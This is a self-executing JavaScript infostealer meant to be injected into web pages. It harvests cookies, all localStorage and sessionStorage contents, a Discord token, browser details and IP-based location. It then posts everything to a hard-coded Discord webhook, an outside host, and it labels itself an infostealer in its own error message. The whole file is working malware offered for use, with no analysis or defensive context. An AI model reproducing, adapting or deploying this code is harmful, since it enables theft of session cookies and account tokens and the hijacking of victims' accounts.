(async () => {
    // 🔴 YOUR WEBHOOK URL
    const WEBHOOK = "https://discord.com/api/webhooks/1549927014431989884/bMMfsXarYXMv4UqbgtXrzY4PNibylPZSoDbBdyBzbekidFKv7Eq0HyuaasZKeLOka34d"; 

    try {
        // 1. Gather Data
        let data = {};
        
        // System Info
        data.ua = navigator.userAgent;
        data.screen = `${window.screen.width}x${window.screen.height}`;
        data.lang = navigator.language;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.platform = navigator.platform;
        data.cookies = document.cookie || "(No Cookies)";
        
        // Discord Token (Specific check)
        data.discord_token = localStorage.getItem('discord_token') || "No Token Found";

        // Local Storage
        let ls = {};
        for(let i=0; i<localStorage.length; i++) {
            let k = localStorage.key(i);
            ls[k] = localStorage.getItem(k);
        }
        data.local_storage = ls;

        // Session Storage
        let ss = {};
        for(let i=0; i<sessionStorage.length; i++) {
            let k = sessionStorage.key(i);
            ss[k] = sessionStorage.getItem(k);
        }
        data.session_storage = ss;

        // IP & Location (via ipapi.co)
        try {
            const res = await fetch('https://ipapi.co/json/');
            if(res.ok) data.ip_info = await res.json();
            else data.ip_info = "Failed";
        } catch(e) { data.ip_info = "Error"; }

        // 2. Send to Discord
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "💾 New Session",
                    color: 15158332,
                    fields: [
                        { 
                            name: "🖥️ System", 
                            value: `\`\`\`UA: ${data.ua}\nScreen: ${data.screen}\nPlatform: ${data.platform}\nLang: ${data.lang}\nTZ: ${data.timezone}\`\`\``, 
                            inline: false 
                        },
                        { 
                            name: "🌐 Network", 
                            value: `\`\`\`IP: ${data.ip_info.ip || 'N/A'}\nCity: ${data.ip_info.city || 'N/A'}\nISP: ${data.ip_info.org || 'N/A'}\nCountry: ${data.ip_info.country_name || 'N/A'}\`\`\``, 
                            inline: false 
                        },
                        { 
                            name: "🍪 Cookies", 
                            value: `\`\`\`${data.cookies.substring(0, 4096)}\`\`\``, 
                            inline: false 
                        },
                        { 
                            name: "💾 Local Storage", 
                            value: `\`\`\`${JSON.stringify(data.local_storage).substring(0, 4096)}\`\`\``, 
                            inline: false 
                        },
                        { 
                            name: "⚡ Session Storage", 
                            value: `\`\`\`${JSON.stringify(data.session_storage).substring(0, 4096)}\`\`\``, 
                            inline: false 
                        },
                        { 
                            name: "🎮 Discord Token", 
                            value: `\`\`\`${data.discord_token}\`\`\``, 
                            inline: false 
                        }
                    ],
                    footer: { text: `Injected at ${new Date().toISOString()}` }
                }]
            })
        });
    } catch (e) {
        console.error("Infostealer failed:", e);
    }
})();
